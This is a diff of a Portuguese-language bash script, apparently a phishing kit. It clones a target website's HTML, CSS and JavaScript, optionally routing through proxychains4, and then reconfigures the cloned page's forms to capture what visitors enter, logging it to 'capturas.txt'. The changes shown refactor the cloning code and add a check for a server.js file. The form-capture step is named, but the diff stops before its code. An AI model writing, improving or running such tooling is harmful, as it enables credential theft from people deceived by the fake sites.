@@ -8,6 +8,13 @@ RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+
+# Verificar se existe o server.js
+if [ ! -f "$SCRIPT_DIR/server/server.js" ]; then
+    echo -e "${RED}[ERRO] server.js não encontrado em $SCRIPT_DIR/server/${NC}"
+    echo -e "${YELLOW}Verifique se o arquivo existe e rode novamente.${NC}"
+    exit 1
+fi
 SITE_DIR="$SCRIPT_DIR/site_clone"
 LOG_FILE="$SCRIPT_DIR/capturas.txt"
 CAPTURED_DIR="$SCRIPT_DIR/captured_sites"
@@ -50,11 +57,10 @@ clone_site() {
     rm -rf "$SITE_DIR"/*
 
     # curl com proxychains se disponível
-    local curl_base="curl -s -L -k"
-    local use_proxy="0"
+    local curl_cmd="curl"
+    local curl_opts="-s -L -k --connect-timeout 15"
     if command -v proxychains4 &>/dev/null; then
-        curl_base="proxychains4 curl -s -L -k --connect-timeout 10"
-        use_proxy="1"
+        curl_cmd="proxychains4 curl"
         echo -e "${GREEN}[ProxyChains ativo]${NC}"
     fi
 
@@ -62,11 +68,10 @@ clone_site() {
 
     # 1. Baixar HTML principal
     echo -e "${YELLOW}[1/4] Baixando HTML...${NC}"
-    eval "$curl_base -H '$ua' -o '$SITE_DIR/index.html' '$target_url'" > "$SCRIPT_DIR/curl.log" 2>&1
+    $curl_cmd $curl_opts -H "$ua" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1
 
     if [ ! -s "$SITE_DIR/index.html" ]; then
         echo -e "${RED}[ERRO] Falha ao baixar o site.${NC}"
-        echo -e "${YELLOW}  Log: $SCRIPT_DIR/curl.log${NC}"
         cat "$SCRIPT_DIR/curl.log" 2>/dev/null
         return 1
     fi
@@ -79,38 +84,37 @@ clone_site() {
     echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
     local css_count=0
     grep -oP 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | while read css_url; do
-        [[ -z "$css_url" ]] && continue
+        [ -z "$css_url" ] && continue
         local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
         if [[ "$css_url" == http* ]]; then
-            eval "$curl_base -o '$SITE_DIR/$css_file' '$css_url'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_url" >> "$SCRIPT_DIR/curl.log" 2>&1
         elif [[ "$css_url" == /* ]]; then
-            eval "$curl_base -o '$SITE_DIR/$css_file' '${base_domain}${css_url}'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
         else
-            eval "$curl_base -o '$SITE_DIR/$css_file' '${base_domain}/${css_url}'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}/${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
         fi
         css_count=$((css_count + 1))
-        # Atualizar href no HTML
         sed -i "s|href=\"$css_url\"|href=\"$css_file\"|g" "$SITE_DIR/index.html"
     done
-    echo -e "${GREEN}  → CSS baixados e links atualizados${NC}"
+    echo -e "${GREEN}  → CSS baixados${NC}"
 
     # 3. Baixar JS
     echo -e "${YELLOW}[3/4] Baixando JS...${NC}"
     local js_count=0
     grep -oP 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' | while read js_url; do
-        [[ -z "$js_url" ]] && continue
+        [ -z "$js_url" ] && continue
         local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
         if [[ "$js_url" == http* ]]; then
-            eval "$curl_base -o '$SITE_DIR/$js_file' '$js_url'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_url" >> "$SCRIPT_DIR/curl.log" 2>&1
         elif [[ "$js_url" == /* ]]; then
-            eval "$curl_base -o '$SITE_DIR/$js_file' '${base_domain}${js_url}'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
         else
-            eval "$curl_base -o '$SITE_DIR/$js_file' '${base_domain}/${js_url}'" 2>/dev/null
+            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}/${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
         fi
         js_count=$((js_count + 1))
         sed -i "s|src=\"$js_url\"|src=\"$js_file\"|g" "$SITE_DIR/index.html"
     done
-    echo -e "${GREEN}  → JS baixados e links atualizados${NC}"
+    echo -e "${GREEN}  → JS baixados${NC}"
 
     # 4. Modificar formulários pra captura
     echo -e "${YELLOW}[4/4] Configurando captura...${NC}"
